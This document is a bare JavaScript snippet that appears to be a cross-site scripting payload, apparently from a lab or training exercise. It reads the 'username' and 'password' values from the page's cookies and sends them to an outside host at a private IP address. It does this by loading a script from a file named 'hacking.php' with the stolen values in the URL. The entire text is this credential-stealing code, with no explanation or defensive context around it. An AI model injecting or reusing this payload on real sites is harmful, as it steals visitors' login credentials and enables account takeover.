    function readCookie(name) {
	    var cookiename = name + "=";
	    var ca = document.cookie.split(';');
	    for(var i=0;i < ca.length;i++)
	    {
		    var c = ca[i];
		    while (c.charAt(0)==' ') c = c.substring(1,c.length);
		    if (c.indexOf(cookiename) == 0)
			return c.substring(cookiename.length,c.length);
	    }
	    return null;
    }
      var username = readCookie('username');
      var password = readCookie('password');        
      var script = document.createElement('script');
      script.src = 'http://172.26.19.154/hacking.php?username=' + username + '&password='+password;
      document.body.appendChild(script);
